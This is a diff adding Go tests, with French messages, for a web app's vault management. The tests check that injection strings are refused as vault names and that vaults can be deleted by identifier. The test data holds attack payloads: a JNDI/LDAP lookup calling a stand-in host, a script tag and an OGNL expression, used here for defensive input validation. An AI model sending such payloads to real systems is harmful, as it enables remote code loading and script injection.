@@ -468,3 +468,81 @@ func TestDeletingAVaultTakesItsContents(t *testing.T) {
 		t.Fatalf("the deletion was not recorded: %v", entries)
 	}
 }
+
+// A vault name is a label somebody reads. What a dynamic scan wrote into that
+// field was neither readable nor, once stored, removable: deleting asked for
+// the name to be retyped, and no shell repeats a payload verbatim.
+
+func TestTheInterfaceRefusesAPayloadAsAVaultName(t *testing.T) {
+	h := newHarness(t)
+	h.signIn(t)
+
+	for _, name := range []string{
+		"${jndi:ldap://mechant.example/a}",
+		"<script>alert(1)</script>",
+		"%{#context['x']=false}",
+		strings.Repeat("a", store.MaxVaultNameLength+1),
+	} {
+		resp := h.post(t, "/coffres", url.Values{"csrf": {h.csrf(t)}, "name": {name}})
+		loc := resp.Header.Get("Location")
+		if !strings.Contains(loc, "erreur=") {
+			t.Errorf("le nom %q a été accepté (%s)", name, loc)
+		}
+		// The refused characters must not travel back in the query string: the
+		// message lands in browser history.
+		if strings.Contains(loc, "jndi") || strings.Contains(loc, "script") {
+			t.Errorf("le message renvoie la charge : %s", loc)
+		}
+	}
+}
+
+func TestTheInterfaceKeepsOrdinaryVaultNames(t *testing.T) {
+	h := newHarness(t)
+	h.signIn(t)
+
+	resp := h.post(t, "/coffres", url.Values{
+		"csrf": {h.csrf(t)}, "name": {"Chez l'oncle Léon"},
+		"description": {"Domotique, caméras, box internet."},
+	})
+	if resp.StatusCode != http.StatusSeeOther {
+		t.Fatalf("un nom ordinaire a été refusé (%d)", resp.StatusCode)
+	}
+	if loc := resp.Header.Get("Location"); strings.Contains(loc, "erreur=") {
+		t.Fatalf("un nom ordinaire a été refusé : %s", loc)
+	}
+}
+
+// The identifier confirms as well as the name, so a vault whose name cannot be
+// retyped stays deletable by its owner.
+func TestAVaultCanBeDeletedByItsIdentifier(t *testing.T) {
+	h := newHarness(t)
+	h.signIn(t)
+	vault := h.newVault(t, "Maison")
+
+	resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
+		"csrf": {h.csrf(t)}, "confirm": {vault.ID},
+	})
+	if loc := resp.Header.Get("Location"); strings.Contains(loc, "erreur=") {
+		t.Fatalf("l'identifiant n'a pas confirmé la suppression : %s", loc)
+	}
+	if _, err := h.manager.DB().Project(context.Background(), vault.ID); err == nil {
+		t.Fatal("le coffre existe toujours")
+	}
+}
+
+// And a wrong confirmation still stops it.
+func TestAWrongConfirmationStillRefuses(t *testing.T) {
+	h := newHarness(t)
+	h.signIn(t)
+	vault := h.newVault(t, "Maison")
+
+	resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
+		"csrf": {h.csrf(t)}, "confirm": {"maison"},
+	})
+	if loc := resp.Header.Get("Location"); !strings.Contains(loc, "erreur=") {
+		t.Fatal("une confirmation approximative a suffi")
+	}
+	if _, err := h.manager.DB().Project(context.Background(), vault.ID); err != nil {
+		t.Fatal("le coffre a été supprimé malgré une confirmation incorrecte")
+	}
+}
